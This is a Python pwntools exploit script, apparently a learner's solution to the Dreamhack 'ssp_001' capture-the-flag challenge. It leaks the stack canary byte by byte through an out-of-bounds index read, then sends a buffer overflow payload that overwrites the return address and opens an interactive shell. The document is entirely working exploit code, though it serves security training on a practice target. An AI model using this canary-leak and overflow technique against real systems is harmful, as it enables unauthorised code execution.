from pwn import *
def slog(n, m): return success(": ".join([n, hex(m)]))

p = remote("host1.dreamhack.games", 12637)
# p = process("./ssp_001")

# [1] Get information about buf
buf2sfp = 0x40+0x4+0x8
buf2cnry = buf2sfp - 8

slog("buf <=> sfp", buf2sfp)
slog("buf <=> canary", buf2cnry)

cnry = b""

index_buf=["131","130","129"]

for index in index_buf:
    p.recvuntil(b"> ")
    p.sendline(b"P") #sendline is have \n
    p.recvuntil(b"Element index : ")
    p.sendline(index) #how to send integer?
    p.recvuntil(b"is : ")
    cnry += p.recvline()[:-1]


#r2s is get string so when we recv => it is naturally byte
#but now is get str(hex)
cnry = str(cnry)
cnry = cnry[2:-1]
cnry=cnry+"00"

# print("Canary : 0x", cnry)
cnry = int(cnry,16)
slog("Canry",cnry)
ret_addr = (int("0x80486b9",16))

print("Making Exploit Payload..")
# [3] Exploit
payload = b"A"*0x40
payload += p32(cnry)
payload += b"B"*0x8 
payload += p32(ret_addr)


p.recvuntil(b"> ")
p.sendline(b"E") #sendline is have \n

print("Exit logic Done. exploiting...")
p.recvuntil(b"Name Size : ")
p.sendline(b"200") #sendline is have \n
p.recvuntil(b"Name : ")
p.send(payload)

print("Exploit Done")
p.interactive()